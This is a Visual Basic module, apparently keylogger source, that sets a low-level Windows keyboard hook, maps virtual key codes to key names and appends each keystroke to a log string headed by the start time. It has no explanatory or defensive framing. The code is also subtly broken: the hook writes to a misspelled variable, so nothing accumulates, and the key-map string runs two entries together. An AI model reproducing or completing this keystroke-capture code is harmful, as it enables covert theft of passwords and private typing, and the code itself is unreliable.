Attribute VB_Name = "Module1"
Public Type EVENTMSG
vKey As Long
sKey As Long
flag As Long
time As Long
End Type
Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Long) As Long
Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hmod As Long, ByVal dwThreadId As Long) As Long
Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Long, ByVal ncode As Long, ByVal wParam As Long, lParam As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Public mymsg As EVENTMSG
Public Const WH_KEYBOARD_LL = 13
Public Const WM_KEYDOWN = &H100
Public hHook&, i%, appStr$, SBUF$, pos1$(), pos2$()


Sub ints() '初始化数据
appStr = "从" & Now & "开始键盘记录如下..." & vbCrLf
SBUF = "96_0|97_1|98_2|99_3|100_4|101_5|102_6|103_7|104_8|105_9|106_*|107_+|109_-|110_.|111_/|13_Enter|144_NumLock|65_A|66_B|67_C|68_D|69_E|70_F|71_G|72_H|73_I|74_J|75_K|76_L|77_M|78_N|79_O|80_P|81_Q|82_R|83_S|84_T|85_U|86_V|87_W|88_X|89_Y|90_Z48_0|49_1|50_2|51_3|52_4|53_5|54_6|55_7|56_8|57_9|192_`|189_-|187_=|220_\|8_BACKSpace|44_Print|45_InSert|46_Delete|145_ScrollLock|36_Home|35_End|19_PauseBreak|33_PageDown|34_PageUp|38_上|40_下|37_左|39_右|27_Esc|112_F1|113_F2|114_F3|115_F4|116_F5|117_F6|118_F7|119_F8|120_F9|121_F10|122_F11|123_F12|9_TAB|20_CapsLock|160_左Shift|162_左Ctrl|91_左Win|13_右Enter|161_右Shift|92_右Win|93_右List|163_右Ctrl"
pos1 = Split(SBUF, "|"): ReDim pos2$(256)
For i = 0 To UBound(pos1) - 1
pos2(Val(pos1(i))) = Mid(pos1(i), InStr(1, pos1(i), "_") + 1)
Next
End Sub
Public Function MyKBHook(ByVal ncode As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
If ncode = 0 Then
If wParam = WM_KEYDOWN Then
CopyMemory mymsg, ByVal lParam, Len(mymsg)
eappStr = appStr & pos2(mymsg.vKey) & " "
End If         'FOR循环和判断结构完全去掉了，取而代之的是一个已经定义好的对应数组
End If
MyKBHook = CallNextHookEx(hHook, ncode, wParam, lParam)
End Function
